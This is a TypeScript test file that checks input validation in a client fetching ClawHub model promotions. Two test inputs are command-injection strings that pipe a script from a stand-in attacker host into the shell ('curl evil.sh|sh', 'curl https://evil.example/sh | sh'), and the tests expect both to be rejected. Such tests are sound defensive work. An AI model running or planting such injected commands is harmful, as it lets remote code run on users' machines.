import { afterEach, describe, expect, it, vi } from "vitest";
import { fetchClawHubPromotion, fetchClawHubPromotions } from "./clawhub-promotions.js";

const CLAWHUB_URL = "https://clawhub.ai";
afterEach(() => vi.restoreAllMocks());
function captureJson(value: unknown) {
  return vi.spyOn(globalThis, "fetch").mockResolvedValue(Response.json(value));
}

const validPromotion = {
  slug: "spring-models",
  title: "Free Example models",
  blurb: "A limited-time offer.",
  status: "active",
  active: true,
  startsAt: 100,
  endsAt: 200,
  provider: "openrouter",
  authChoiceId: "openrouter-api-key",
  models: [{ modelRef: "openrouter/example/model-alpha", alias: "Alpha", suggestedDefault: true }],
  signupUrl: "https://signup.example.com",
};

describe("promotion payload validation", () => {
  async function expectPromotionRejected(
    overrides: Record<string, unknown>,
    expected: RegExp,
  ): Promise<void> {
    const request = captureJson({ ...validPromotion, ...overrides });
    await expect(fetchClawHubPromotion({ slug: "spring-models" })).rejects.toThrow(expected);
    expect(request.mock.calls[0]?.[0]).toBe(CLAWHUB_URL + "/api/v1/promotions/spring-models");
  }

  it("rejects payloads without models", async () => {
    await expectPromotionRejected({ models: [] }, /models/);
  });

  it("rejects slugs outside ClawHub's slug contract", async () => {
    await expectPromotionRejected({ slug: "deal; curl evil.sh|sh" }, /slug/);
  });

  it("rejects model refs with shell metacharacters", async () => {
    await expectPromotionRejected(
      { models: [{ modelRef: "openrouter/foo; curl https://evil.example/sh | sh" }] },
      /unsupported characters/,
    );
  });

  it("rejects non-string model refs", async () => {
    await expectPromotionRejected({ models: [{ modelRef: 42 }] }, /modelRef/);
  });

  it("rejects non-numeric windows", async () => {
    await expectPromotionRejected({ endsAt: "soon" }, /endsAt/);
  });

  it("rejects inverted promotion windows", async () => {
    await expectPromotionRejected({ startsAt: 200, endsAt: 200 }, /window/);
  });

  it("rejects plugin values that are not package names", async () => {
    await expectPromotionRejected(
      { pluginNames: ["@openclaw/openrouter-provider@latest"] },
      /pluginNames/,
    );
  });
});

describe("promotion fetches", () => {
  it("fetches and validates the active promotions list", async () => {
    const request = captureJson({ promotions: [validPromotion] });
    const promotions = await fetchClawHubPromotions();
    expect(promotions).toHaveLength(1);
    expect(request.mock.calls[0]?.[0]).toBe(CLAWHUB_URL + "/api/v1/promotions");
  });

  it("rejects a list response without a promotions array", async () => {
    captureJson({ nope: true });
    await expect(fetchClawHubPromotions()).rejects.toThrow(/promotions array/);
  });
});
